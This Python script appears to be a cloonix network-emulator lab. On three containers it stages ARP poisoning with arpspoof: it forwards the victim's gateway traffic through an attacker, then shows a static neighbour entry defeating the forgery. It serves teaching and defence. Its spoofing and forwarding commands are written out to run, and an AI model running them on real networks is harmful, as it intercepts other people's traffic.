#!/usr/bin/env python3
r"""arp - the address protocol with no security, and the poisoning it allows.

    ./arp.py [net]                 the net defaults to nemo

Three machines on one lan: a victim, its gateway, and an attacker::

           victim -- lan1 -- gateway
   10.0.0.10  |                 10.0.0.1
              |
           attacker 10.0.0.66

  arp maps an IP to a mac on a lan, and believes any answer it hears. The
  attacker uses that to put itself between the victim and its gateway.

  ACT 1  the victim resolves the gateway honestly; its arp table holds the
         real mac of the gateway.
  ACT 2  the attacker sends the victim a forged arp: "10.0.0.1 is at my
         mac". The victim's table now points the gateway's IP at the
         attacker; traffic for the gateway goes through the attacker, who
         forwards it, a machine in the middle.
  ACT 3  the victim's table is cleaned and a static entry pins the gateway
         to its real mac; the same forgery no longer moves it.

Image: arp_trixie (dsniff for arpspoof, iputils-arping)
Size:  3 containers, 1 lan

THE PACKET TO CATCH
-------------------
  arp has its own ethertype, not IP; the filter has the word:

    cloonix cli nemo cnf victim eth0 sniff=on
    cloonix cli nemo sniff victim eth0 --dump arp

  The packet worth catching is the attacker's reply in ACT 2: an arp for
  10.0.0.1 carrying the attacker's mac, sent to the victim which asked
  nobody.

Important
  Nothing is baked into the image: the forwarding and the spoof are set at
  run time. This is the technique shown so it can be recognised and
  stopped, on a lan of your own.
"""
import os
import sys
import time

# What every demo shares is in demos/lib/demolib.py.
sys.dont_write_bytecode = True
_HERE = os.path.dirname(os.path.abspath(__file__))
sys.path[:0] = [os.path.join(_d, "lib") for _d in (
    _HERE, os.path.dirname(_HERE),
    os.environ.get("CLOONIX_DEMO_DIR", "/usr/share/cloonix/demos"))]
from demolib import (
    NET, build, check_net, choose_rootfs, count_on, erase_net, hold, place,
    ssh, step, story, tools_present)

HISTORY = """\
ARP was written by David Plummer in 1982, RFC 826, one page: a machine that
needs the mac behind an IP shouts the question on the wire, the owner
answers. It has no notion of who may answer, and a host takes the newest
reply, so a machine on the lan can claim any address by saying so.
The attack was folklore for years; Dug Song made it a command in 1999 with
dsniff, whose arpspoof is used here. The defence, dynamic ARP inspection on
the switch, checking arp against the DHCP leases, came much later and lives
in the switch, not in the protocol.

Today: arp is unchanged and still trusted on every IPv4 lan; the poisoning
is a standard step of a man-in-the-middle on a local network, and the reason
a careful network pins its gateway and inspects arp at the switch. IPv6
replaces arp with neighbour discovery, protected by SEND, rarely deployed.
"""

ROOTFS_CHOICES = ("arp_trixie",)

VICTIM, GW, ATT = "victim", "gateway", "attacker"
ALL = (VICTIM, GW, ATT)
LAN = "lan1"

WIRING = {
    VICTIM: [(0, LAN, "10.0.0.10/24")],
    GW:     [(0, LAN, "10.0.0.1/24")],
    ATT:    [(0, LAN, "10.0.0.66/24")],
}
GATEWAY = {}

def mac_of(node):
    return ssh(node, "cat /sys/class/net/eth0/address", check=False).strip()

def gw_mac_in_victim():
    out = ssh(VICTIM, "ip neigh show 10.0.0.1 dev eth0", check=False)
    for word in out.split():
        if ":" in word and len(word) == 17:
            return word
    return ""

def resolve_gw():
    ssh(VICTIM, "ip neigh flush dev eth0", check=False)
    ssh(VICTIM, "arping -c 2 -w 3 10.0.0.1 >/dev/null 2>&1; true", check=False)
    ssh(VICTIM, "ping -c 1 -W 1 10.0.0.1 >/dev/null 2>&1; true", check=False)
    time.sleep(1)
    return gw_mac_in_victim()

LAYOUT = {
    VICTIM: (-260, -150), LAN: (0, 0), GW: (300, 0), ATT: (-260, 150),
}
ETHS = {(VICTIM, "eth0"): 120, (GW, "eth0"): 270, (ATT, "eth0"): 60}

CARD = r"""
           victim -- lan1 -- gateway
   10.0.0.10  |                 10.0.0.1
              |
           attacker 10.0.0.66

  arp trusts any answer. The attacker claims to be the gateway, and the
  victim's traffic for 10.0.0.1 goes through it.
"""

def main():
    story(HISTORY)
    step("checking the server")
    check_net()
    step("looking for the image")
    rootfs = choose_rootfs()
    erase_net()
    place()
    story(CARD)
    story("  image: %s" % rootfs)

    step("creating and cabling the three machines")
    build(rootfs)
    tools_present(ATT, "arpspoof")
    tools_present(VICTIM, "arping")

    real_gw = mac_of(GW)
    att_mac = mac_of(ATT)
    story("    the real macs:")
    story("      gateway  10.0.0.1  %s" % real_gw)
    story("      attacker 10.0.0.66 %s" % att_mac)

    step("act 1: the victim resolves the gateway honestly")
    story()
    seen = resolve_gw()
    story("    victim's arp entry for 10.0.0.1:")
    story("      %s" % (seen or "(none)"))
    ok_honest = (seen == real_gw)
    story()
    story("    It points at the real gateway, the mac the gateway answered")
    story("    with. Nothing yet says a lie is possible.")
    hold()

    step("act 2: the attacker forges an arp, and the entry moves to it")
    story()
    ssh(ATT, "sysctl -w net.ipv4.ip_forward=1 >/dev/null")
    ssh(ATT, "pkill -f arpspoof 2>/dev/null; true", check=False)
    # arpspoof tells the victim that the gateway is at the attacker's mac.
    got = count_on(VICTIM, 0, "arp",
                   lambda: (ssh(ATT,
                       "setsid arpspoof -i eth0 -t 10.0.0.10 10.0.0.1 "
                       "</dev/null >/tmp/spoof.log 2>&1 &"),
                       time.sleep(6))[0], settle=2.0)
    poisoned = gw_mac_in_victim()
    story("    victim's arp entry for 10.0.0.1 now:")
    story("      %s" % (poisoned or "(none)"))
    if got is not None:
        story("      %d arp packet(s) on the victim's wire during the spoof"
              % got["count"])
    story()
    story("    The gateway's IP now points at the attacker's mac. The victim")
    story("    sends the attacker every frame meant for the gateway; with")
    story("    forwarding on, the attacker passes them along and reads them.")
    ok_poisoned = (poisoned == att_mac)
    hold()

    step("act 3: pin the gateway, and the same forgery no longer moves it")
    story()
    ssh(VICTIM, "ip neigh flush dev eth0", check=False)
    ssh(VICTIM, "ip neigh replace 10.0.0.1 lladdr %s dev eth0 nud permanent"
        % real_gw)
    time.sleep(4)
    pinned = gw_mac_in_victim()
    story("    victim's arp entry for 10.0.0.1, with the spoof still running:")
    story("      %s" % (pinned or "(none)"))
    ssh(ATT, "pkill -f arpspoof 2>/dev/null; true", check=False)
    ok_pinned = (pinned == real_gw)
    story()
    story("    A static entry ignores the forged replies. On a real network")
    story("    the switch does this for every host at once, checking arp")
    story("    against the addresses it handed out: dynamic ARP inspection.")
    hold()

    if not (ok_honest and ok_poisoned and ok_pinned):
        sys.exit("a check failed: honest=%s poisoned=%s pinned=%s"
                 % (ok_honest, ok_poisoned, ok_pinned))

    story("""
the network is left up. Things worth trying:

  watch the forged replies arrive, two a second:
    cloonix cli %s sniff victim eth0 --dump arp
    cloonix cli %s ssh attacker "arpspoof -i eth0 -t 10.0.0.10 10.0.0.1"

  the victim's table moving under it, then pinned:
    cloonix cli %s ssh victim "ip neigh show dev eth0"
    cloonix cli %s ssh victim "ip neigh replace 10.0.0.1 lladdr %s dev eth0 nud permanent"
""" % (NET, NET, NET, NET, real_gw))

main()
